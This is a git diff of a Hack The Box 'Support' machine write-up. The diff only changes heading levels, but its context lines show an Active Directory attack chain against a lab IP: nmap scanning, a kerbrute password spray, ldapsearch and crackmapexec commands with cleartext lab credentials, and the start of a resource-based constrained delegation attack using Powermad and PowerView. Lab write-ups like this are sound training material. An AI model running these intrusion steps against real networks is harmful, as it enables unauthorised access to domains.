@@ -8,7 +8,7 @@ tags:
 Machine: https://app.hackthebox.com/machines/484
 
 # Enumeration
-## Service & Version
+## Enumeration service / versions 
 - We can use [[content/Tools/Nmap|Nmap]] to enumerate de opened ports
 ```bash
 nmap -p- -sS -n -Pn --min-rate 5000 10.10.11.174 -oG allPorts
@@ -245,7 +245,7 @@ kerbrute_linux_amd64 passwordspray usernames 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%l
 >![[Pasted image 20250225154148.png]]
 
 # Lateral Movement
-### Ldap (Using creds)
+## Ldap (Using creds)
 - if we looking for information about the found users, we can see something interesting in the user 'support'
 ```bash
 ldapsearch -H ldap://10.10.11.174 -x -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -D 'ldap@support.htb' -b "DC=support,DC=htb" "*"
@@ -291,7 +291,7 @@ crackmapexec winrm 10.10.11.174 -u 'support' -p 'Ironside47pleasure40Watchful'
 >[!example]- Result
 >![[Pasted image 20250225172951.png]]
 
-### RBCD (resource based constrained delegation attack)
+## RBCD (resource based constrained delegation attack)
 - To perform this attack we are going to use [[rcbd.py]] (as well we can use [[content/Tools/Rubeus.exe|Rubeus.exe]] like the example of hacktricks), more info [here](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/resource-based-constrained-delegation.html#attack), first, we crate a computer object inside domaing using [[powermad]], so upload [[powermad]] and [[PowerView]] to the victim machine
 ```bash
 upload /home/jr117/Desktop/jr117/herramientas/Powermad
